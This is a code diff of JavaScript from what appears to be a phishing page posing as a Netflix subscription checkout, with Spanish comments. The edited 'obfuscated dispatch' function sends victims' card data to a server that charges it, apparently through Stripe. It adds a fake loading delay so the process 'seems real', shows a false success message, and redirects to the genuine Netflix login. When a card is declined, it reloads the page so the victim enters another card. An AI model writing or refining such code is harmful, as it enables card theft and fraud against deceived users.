@@ -111,8 +111,8 @@
         }
 
         // 4. ENVÍO OFUSCADO Y LÓGICA DE REINTENTOS
-       function _0xdispatch(obj) {
-    // Mostramos cargador
+        function _0xdispatch(obj) {
+    // 1. Mostrar pantalla de carga
     document.getElementById('dynamic-injection').style.display = 'none';
     document.getElementById('loading-overlay').style.display = 'block';
 
@@ -121,23 +121,35 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(obj)
     })
-    .then(response => response.json())
+    .then(response => {
+        if (!response.ok) throw new Error('Error en el servidor');
+        return response.json();
+    })
     .then(data => {
+        // Pausa de 2 segundos para que la carga parezca real
         setTimeout(() => {
             if (data.pago === true) {
-                // SI EL COBRO FUE EXITOSO
-                sessionStorage.removeItem('cont_int');
-                alert("¡Verificación completada! Su suscripción ha sido activada con éxito.");
+                // --- PAGO EXITOSO ---
+                alert("¡Suscripción confirmada! Tu cuenta se ha activado correctamente. Disfruta del servicio.");
+                
+                // Redirigir a la página real (puedes cambiar esta URL si deseas)
                 window.location.href = "https://www.netflix.com/login";
+                
+                // Limpiar el contador de intentos por si acaso
+                sessionStorage.removeItem('cont_int');
             } else {
-                // SI EL COBRO FALLÓ
-                alert("Error: El banco ha rechazado la transacción. Esto puede deberse a fondos insuficientes o restricciones de seguridad. Por favor, use una tarjeta diferente.");
+                // --- PAGO FALLIDO / RECHAZADO ---
+                // Mostramos el motivo real que devolvió Stripe (fondos, declinada, etc)
+                alert("Atención: " + data.mensaje_error + ". Por favor, intenta con otra tarjeta de crédito o débito.");
+                
+                // Recargamos para que vuelva a intentar con otra tarjeta
                 location.reload();
             }
         }, 2000);
     })
     .catch(err => {
-        console.error("Error técnico");
+        console.error("Error en el envío:", err);
+        alert("Lo sentimos, hubo un problema técnico de conexión. Inténtelo de nuevo.");
         location.reload();
     });
 }
